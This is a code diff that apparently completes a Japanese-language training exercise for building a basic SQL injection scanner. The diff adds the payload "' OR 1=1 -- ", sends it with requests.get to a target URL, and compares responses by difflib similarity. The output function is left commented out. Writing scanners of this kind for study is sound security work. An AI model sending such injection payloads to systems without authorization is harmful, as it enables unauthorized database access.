@@ -7,6 +7,7 @@
 from typing import List, TextIO
 import argparse
 import sys
+import requests
 
 MIN_THRESHOLD = 0.05
 MAX_THRESHOLD = 0.95
@@ -56,6 +57,7 @@ def construct_payloads(key_name: str) -> List[Payload]:
         return []
 
     payload_list = [
+        "' OR 1=1 -- "
         # TODO: step5: ここに構築したペイロードを追加してください
     ]
     return [Payload(key_name, payload) for payload in payload_list]
@@ -75,7 +77,11 @@ def get_response_with_payload(
         params = {payload.key: payload.value}
 
     # TODO: HTTPリクエストを送って、結果を取得する部分を書いてください
-    return None
+    resp = requests.get(target_url, params=params)
+    return resp
+
+
+import difflib
 
 
 def calc_similarity_between_given_two_values(val1: str, val2: str) -> float:
@@ -86,8 +92,15 @@ def calc_similarity_between_given_two_values(val1: str, val2: str) -> float:
     """
 
     # TODO: similarityを算出する部分を書いてください
+    # difflib
+    matcher = difflib.SequenceMatcher()
+    matcher.set_seq1(val1)
+    matcher.set_seq2(val2)
+    diffs = difflib.unified_diff(val1.split(), val2.split())
+    for d in diffs:
+        print(d)
 
-    return 0.0
+    return matcher.quick_ratio()
 
 
 def output_vulnerabilities(results: List[Vulnerability], out: TextIO = sys.stdout):
@@ -97,7 +110,8 @@ def output_vulnerabilities(results: List[Vulnerability], out: TextIO = sys.stdou
     """
 
     # TODO: 結果を出力する部分を書いてください
-    pass
+    # for result in results:
+    #     print(result.resp, file=out)
 
 
 def parse_args() -> tuple[str, str]:
